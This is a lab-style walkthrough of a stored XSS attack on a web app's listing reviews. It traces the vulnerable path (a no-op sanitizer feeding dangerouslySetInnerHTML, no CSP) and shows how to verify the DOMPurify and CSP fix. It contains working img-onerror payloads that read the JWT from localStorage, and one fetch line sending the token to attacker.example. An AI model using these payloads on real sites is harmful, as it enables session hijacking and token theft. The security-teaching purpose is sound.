# Flow — Simulating the Stored XSS Attack

This walkthrough describes the original vulnerable version of *Reviews on listings*.
In that version, a review's body was stored exactly as typed and rendered as raw HTML,
allowing a classic **stored (persistent) Cross-Site Scripting (XSS)** attack. The
implementation has since been fixed: review markup is sanitized before rendering and a
Content-Security-Policy restricts which scripts the browser can run.

Because the app keeps its login token (`JWT`) in `localStorage`, the injected script can
read that token and hijack the victim's session.

The steps below document the original attack and its vulnerable code path. Use the
verification section to confirm that the current implementation blocks it.

---

## 0. Prerequisites & setup

From the **project root** (`Task-5.2/`):

```bash
npm install          # installs server + client (npm workspaces)
```

Make sure `server/.env` exists (create it if missing):

```
PORT=4000
MONGO_URI=<your MongoDB connection string>
JWT_SECRET=<any long random string>
JWT_EXPIRES_IN=7d
```

Start both apps:

```bash
npm run dev          # API on http://localhost:4000, client on http://localhost:5175
```

Open the client at **http://localhost:5175**.

---

## 1. Create an account and a listing

You need a logged-in user and a listing to attach a review to.

1. Click **Register**, create a user (e.g. `attacker@test.dev` / `secret123`).
2. You are now logged in — your JWT is saved in the browser under
   `localStorage['token']` (open DevTools → Application → Local Storage to see it).
3. Click **Sell an Item**, create any listing (e.g. *"Calculus Textbook"*, price `20`).
4. Go to **Listings** — your item appears with a **Reviews** button.

---

## 2. Plant the malicious review (the attack)

1. On your listing's card, click **Reviews** (this opens `/listings/<id>/reviews`).
2. In the **Your review** box, paste this payload as the review body and post it:

   ```html
   <img src=x onerror="alert('XSS — your token: ' + localStorage.getItem('token'))">
   ```

3. The review is now saved on the server **unchanged**.

> **Why `<img onerror>` and not `<script>`?**
> When HTML is injected through `innerHTML` / React's `dangerouslySetInnerHTML`, the
> browser **does not execute a bare `<script>` tag**. So a naive `<script>alert(1)</script>`
> payload looks scary but stays inert. Attackers instead use an element with an **event
> handler that fires automatically** — here `<img src=x>` fails to load (there is no image
> `x`), which triggers its `onerror` handler and runs our JavaScript. `<svg onload=...>`
> works the same way.

---

## 3. Observe the attack on the vulnerable baseline

As soon as the reviews list renders your review (it happens immediately after posting,
and again every time the page is loaded):

- An **alert box pops up showing the JWT** currently in `localStorage`.
- That proves **arbitrary attacker-controlled JavaScript is running** in the page, with
  full access to the victim's storage, cookies, and the logged-in session.

The alert is just a visible proof. A real attacker would **silently exfiltrate** the token
instead, e.g.:

```html
<img src=x onerror="fetch('https://attacker.example/steal?t=' + localStorage.getItem('token'))">
```

This is **stored/persistent** XSS: the payload lives in the database, so **every logged-in
user who opens that listing's reviews page** has their token stolen — no further action by
the attacker required.

---

## 4. Why it worked (the vulnerable code path)

Trace a review body from input to screen:

1. **Server stores it raw** — `server/src/controllers/reviewController.js` validates only
   that `body` is a non-empty string (Joi). No HTML sanitization or escaping. It is saved
   verbatim and returned verbatim by `GET /api/reviews`.
2. **Client "sanitizes" it with a no-op** — `client/src/lib/sanitize.js`:

   ```js
   export const sanitizeHtml = (dirty) => dirty;   // returns the HTML untouched
   ```

3. **Client injects it as HTML** — `client/src/components/ReviewList.jsx`:

   ```jsx
   <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(r.body) }} />
   ```

   `dangerouslySetInnerHTML` sets `innerHTML` directly, so the attacker's markup becomes
   live DOM — including the `onerror` handler, which the browser runs.
4. **Nothing stopped the inline script** — the original server sent no
   Content-Security-Policy header, so the browser had no policy telling it to refuse
   inline/injected JavaScript.

## 5. Verify the fix

Post the payload from step 2 with the current implementation. It remains stored as
review text, but DOMPurify removes the unsupported image and its event handler before the
HTML reaches the rendering sink, so no alert runs. Try the `<svg onload=...>` and
`javascript:` link variants as well: the allowlist removes unsupported elements and
DOMPurify rejects unsafe link protocols. Legitimate formatting such as bold text and
links remains available.

The API also sends a Content-Security-Policy header (`script-src 'self'`) through
Helmet. This independently blocks inline script execution if unsafe markup ever reaches
a browser, providing defense in depth alongside DOMPurify.

---

## Running the tests locally

A test suite ships with the project. Run it from the **project root**:

```bash
npm install     # first time only
npm test        # (same as: npm run test)
```

The tests encode the secure behavior:

- Review HTML is sanitized before rendering, and API responses include a CSP that blocks
  inline scripts.
- The client and server test suites should pass with the fix in place.

Notes:

- The server tests spin up an **in-memory MongoDB** via `mongodb-memory-server`. The first
  run downloads a small `mongod` binary, so you need **internet access the first time**
  (it is cached afterwards).
- You need **Node.js 18+ (20 recommended)** installed.
- The same `npm test` works on **Windows, macOS, and Linux** — no OS-specific setup.
